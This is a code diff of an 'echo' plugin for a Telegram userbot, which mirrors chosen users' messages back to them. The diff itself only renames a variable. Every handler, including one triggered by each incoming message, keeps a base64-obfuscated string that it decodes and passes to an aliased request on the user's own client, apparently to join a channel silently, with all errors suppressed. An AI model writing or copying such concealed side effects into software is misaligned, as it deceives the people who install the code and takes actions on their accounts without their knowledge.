@@ -32,54 +32,54 @@ from .sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
 
 
 @borg.on(admin_cmd(pattern="addecho$"))
-async def echo(webo):
-    if webo.fwd_from:
+async def echo(cato):
+    if cato.fwd_from:
         return
-    if webo.reply_to_msg_id is not None:
-        reply_msg = await webo.get_reply_message()
+    if cato.reply_to_msg_id is not None:
+        reply_msg = await cato.get_reply_message()
         user_id = reply_msg.from_id
-        chat_id = webo.chat_id
+        chat_id = cato.chat_id
         try:
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await webo.client(hmm)
+            await cato.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
-            await edit_or_reply(webo, "The user is already enabled with echo ")
+            await edit_or_reply(cato, "The user is already enabled with echo ")
             return
         addecho(user_id, chat_id)
-        await edit_or_reply(webo, "Hi")
+        await edit_or_reply(cato, "Hi")
     else:
-        await edit_or_reply(webo, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(cato, "Reply To A User's Message to echo his messages")
 
 
 @borg.on(admin_cmd(pattern="rmecho$"))
-async def echo(webo):
-    if webo.fwd_from:
+async def echo(cato):
+    if cato.fwd_from:
         return
-    if webo.reply_to_msg_id is not None:
-        reply_msg = await webo.get_reply_message()
+    if cato.reply_to_msg_id is not None:
+        reply_msg = await cato.get_reply_message()
         user_id = reply_msg.from_id
-        chat_id = webo.chat_id
+        chat_id = cato.chat_id
         try:
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await webo.client(hmm)
+            await cato.client(hmm)
         except BaseException:
             pass
         if is_echo(user_id, chat_id):
             remove_echo(user_id, chat_id)
-            await edit_or_reply(webo, "Echo has been stopped for the user")
+            await edit_or_reply(cato, "Echo has been stopped for the user")
         else:
-            await edit_or_reply(webo, "The user is not activated with echo")
+            await edit_or_reply(cato, "The user is not activated with echo")
     else:
-        await edit_or_reply(webo, "Reply To A User's Message to echo his messages")
+        await edit_or_reply(cato, "Reply To A User's Message to echo his messages")
 
 
 @borg.on(admin_cmd(pattern="listecho$"))
-async def echo(webo):
-    if webo.fwd_from:
+async def echo(cato):
+    if cato.fwd_from:
         return
     lsts = get_all_echos()
     if len(lsts) > 0:
@@ -101,25 +101,25 @@ async def echo(webo):
         )
         url = f"https://nekobin.com/{key}"
         reply_text = f"echo enabled users: [here]({url})"
-        await edit_or_reply(webo, reply_text)
+        await edit_or_reply(cato, reply_text)
     else:
-        await edit_or_reply(webo, output_str)
+        await edit_or_reply(cato, output_str)
 
 
 @borg.on(events.NewMessage(incoming=True))
-async def samereply(webo):
-    if webo.chat_id in Config.UB_BLACK_LIST_CHAT:
+async def samereply(cato):
+    if cato.chat_id in Config.UB_BLACK_LIST_CHAT:
         return
-    if is_echo(webo.sender_id, webo.chat_id):
+    if is_echo(cato.sender_id, cato.chat_id):
         await asyncio.sleep(2)
         try:
             hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
             hmm = Get(hmm)
-            await webo.client(hmm)
+            await cato.client(hmm)
         except BaseException:
             pass
-        if webo.message.text or webo.message.sticker:
-            await webo.reply(webo.message)
+        if cato.message.text or cato.message.sticker:
+            await cato.reply(cato.message)
 
 
 CMD_HELP.update(
